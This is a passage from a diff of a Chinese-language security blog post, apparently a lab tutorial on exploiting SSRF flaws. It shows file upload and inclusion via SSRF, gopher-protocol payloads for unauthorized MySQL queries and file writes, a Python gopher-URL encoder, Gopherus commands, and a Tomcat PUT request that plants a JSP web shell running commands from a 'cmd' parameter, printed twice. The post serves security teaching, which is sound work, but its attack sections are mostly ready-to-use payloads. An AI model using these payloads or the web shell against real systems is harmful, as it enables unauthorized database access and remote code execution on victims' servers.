+<h4 id="使用ssrf进行文件上传漏洞"><a href="#使用ssrf进行文件上传漏洞" class="headerlink" title="使用ssrf进行文件上传漏洞"></a>使用ssrf进行文件上传漏洞</h4><img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/f4ba361e4b5fe75ff66ffe788110dd70.png" class="" title="img">
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/e19a6b211215dd9d2e707a4db63b0f8e.png" class="" title="img">
+
+<h4 id="使用ssrf进行文件包含漏洞"><a href="#使用ssrf进行文件包含漏洞" class="headerlink" title="使用ssrf进行文件包含漏洞"></a>使用ssrf进行文件包含漏洞</h4><p>运用到了很多的php伪协议</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/b224dac03b8d3b1c9493eaef9c100576.png" class="" title="img">
+
+<h4 id="使用ssrf对mysql进行未授权查询"><a href="#使用ssrf对mysql进行未授权查询" class="headerlink" title="使用ssrf对mysql进行未授权查询"></a>使用ssrf对mysql进行未授权查询</h4><p>未授权意思就是我们不用密码直接登入数据库进行查询</p>
+<p>这个实验如果想在本地机进行实验的话需要我们现在kali上面搭建一个自己的mysql数据库</p>
+<p>1.在kali里面先打开一个窗口运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo port 3306 -w mysql.pcpng</span><br><span class="line">3306是msyql数据库的默认端口号</span><br></pre></td></tr></table></figure>
+
+<p>2.同时再打开一个窗口写入指令（查看数据库的指令），回车</p>
+<p>3.抓取到数据包之后将抓取到的文件放在本地的wishark里面进行分析</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/b3f4d2e597953290f582b060d5664652.png" class="" title="img">
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/474fbe248eca4b890cdba059db1c0004.png" class="" title="img">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">results</span>(<span class="params">s</span>):</span><br><span class="line">  a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">2</span>)]</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span>+<span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  s=sys.argv[<span class="number">1</span>]</span><br><span class="line">  <span class="built_in">print</span>(results(s))</span><br><span class="line">//<span class="built_in">ascii</span>码转换成url编码</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+<p>使用工具构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#python2.7 gopherus.py --exploit mysq!</span><br><span class="line">Give MySOL username: root</span><br><span class="line">Give query to execute: select * from security.users</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/a985cd3bfad9691d0bd0b8f4ba158208.png" class="" title="img">
+
+<h4 id="使用ssrf对mysql未授权文件写入"><a href="#使用ssrf对mysql未授权文件写入" class="headerlink" title="使用ssrf对mysql未授权文件写入"></a>使用ssrf对mysql未授权文件写入</h4><p>在进行写入这个操作之前我们要查看以下是否有写入权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#python2.7 gopherus.py --exploit mysq!</span><br><span class="line">Give MySOL username: root</span><br><span class="line">Give query to execute: show variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在生成一个paylaod之后我们将ip地址改为我们攻击的内网主机ip，然后将生成的payloa提交即可</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/2289c152f81cf5ee1ec86c9707fa1415.png" class="" title="img">
+
+<p>然后再进行写入的动作</p>
+<p>此时是将文件写入到&#x2F;var&#x2F;www&#x2F;html这个路径下面</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/098d4d53328538bc0729adce8902d57c.png" class="" title="img">
+
+<h4 id="使用ssrf对tomcat文件写入"><a href="#使用ssrf对tomcat文件写入" class="headerlink" title="使用ssrf对tomcat文件写入"></a>使用ssrf对tomcat文件写入</h4><p>tomcat漏洞工作在8080端口</p>
+<p>首先先验证以下这个靶场是否存在tomcat漏洞</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/5342687a97f43a384c02f6315f435319.png" class="" title="img">
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/20f54f6caa7c1a6ab9f8a4fd7d91b480.png" class="" title="img">
+
+<p>发现存在</p>
+<p>继续进行</p>
+<p>下面是文件写入的内容（payload信息）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080   //目标靶机IP</span><br><span class="line">Accept:*/*</span><br><span class="line">Accept-Language:en</span><br><span class="line">User-Agent:Mozilla/5.0 (compatible; MSlE 9.0; Windows NT 6.1;Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 460      //内容长度</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">if(command!=null)//请求获取command变量“cmd”</span><br><span class="line">&#123;</span><br><span class="line">java.io.inputStream</span><br><span class="line">in=Runtime.getRuntime().exec(command).getlnputStream();//exec执行变量”cmd”内容</span><br><span class="line">int a =-1;</span><br><span class="line">byte[] b = new byte[2048];</span><br><span class="line">out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">while((a=in.read(b))!=-1)</span><br><span class="line">&#123;</span><br><span class="line">out.println(new String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">out.print(&quot;format: xxx.jsp?cmd=Command&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>和上面的操作都一样将这个paylaod粘在gopher协议后面，将这个payloadurl编码两次然后提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSlE 9.0; Windows NT 6.1;Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 460</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">if(command != null)</span><br><span class="line">&#123;</span><br><span class="line">  java.io.InputStream</span><br><span class="line">in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">  int a =-1;</span><br><span class="line">  byte[] b = new byte[2048];</span><br><span class="line">  out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">  while((a=in.read(b))!=-1)</span><br><span class="line">  &#123;</span><br><span class="line">    out.println(new String(b));</span><br><span class="line">  &#125;</span><br><span class="line">  out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">  out.print(&quot;format: xxx.jsp?cmd=Command&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/e732f6080d08b379a71d32bd91071914-17548173734481.png" class="" title="e732f6080d08b379a71d32bd91071914">
+
+<p>将payload进行两次paylaod编码</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/663934c5733dad1cd8af9370feb33a15-17548173984232.png" class="" title="663934c5733dad1cd8af9370feb33a15">
+
+<p>然后来验证以下我们是否文件写入成功</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/b09c5a38446648fa599e4afb9e92eb93-17548174264493.png" class="" title="b09c5a38446648fa599e4afb9e92eb93">
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/b9e40c07ced5fa4da3a7ab03871dff30.png" class="" title="img">
+
+<p>以上验证我们文件写入成功</p>
+
     </article>
     
     <div class="read-nums">
@@ -394,7 +660,7 @@
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">SSRF漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">SSRF漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">SSRF漏洞验证方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%82%B9"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞可能出现点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88URL%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞利用（URL的伪协议）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.内网访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.5.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%88file%E5%8D%8F%E8%AE%AE%EF%BC%89%EF%BC%88%E6%9F%A5%E6%89%BE%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BAip%EF%BC%89"><span class="toc-number">1.5.3.</span> <span class="toc-text">2.读取文件（file协议）（查找内网存活主机ip）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-dict%E5%8D%8F%E8%AE%AE-%EF%BC%88%E6%9F%A5%E6%89%BE%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%EF%BC%89"><span class="toc-number">1.5.4.</span> <span class="toc-text">3.端口扫描(dict协议)（查找内网主机开放端口）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.5.5.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-http%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E8%8E%B7%E5%8F%96%E5%AD%90%E9%A1%B5%E9%9D%A2%EF%BC%89"><span class="toc-number">1.5.6.</span> <span class="toc-text">4.http伪协议（目录扫描获取子页面）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8F%91%E9%80%81get%EF%BC%8Cpost%E8%AF%B7%E6%B1%82%EF%BC%88gopher%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">1.5.7.</span> <span class="toc-text">5.发送get，post请求（gopher协议）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#get%E6%8F%90%E4%BA%A4"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">get提交</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#post%E6%8F%90%E4%BA%A4"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">post提交</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.6.</span> <span class="toc-text">ssrf绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ssrf%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">使用ssrf进行文件上传漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ssrf%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">使用ssrf进行文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ssrf%E5%AF%B9mysql%E8%BF%9B%E8%A1%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.6.0.3.</span> <span class="toc-text">使用ssrf对mysql进行未授权查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ssrf%E5%AF%B9mysql%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">1.6.0.4.</span> <span class="toc-text">使用ssrf对mysql未授权文件写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ssrf%E5%AF%B9tomcat%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">1.6.0.5.</span> <span class="toc-text">使用ssrf对tomcat文件写入</span></a></li></ol></li></ol></li></ol></li></ol>
       </div>
       
         <div class="catelogue catelogue-2">
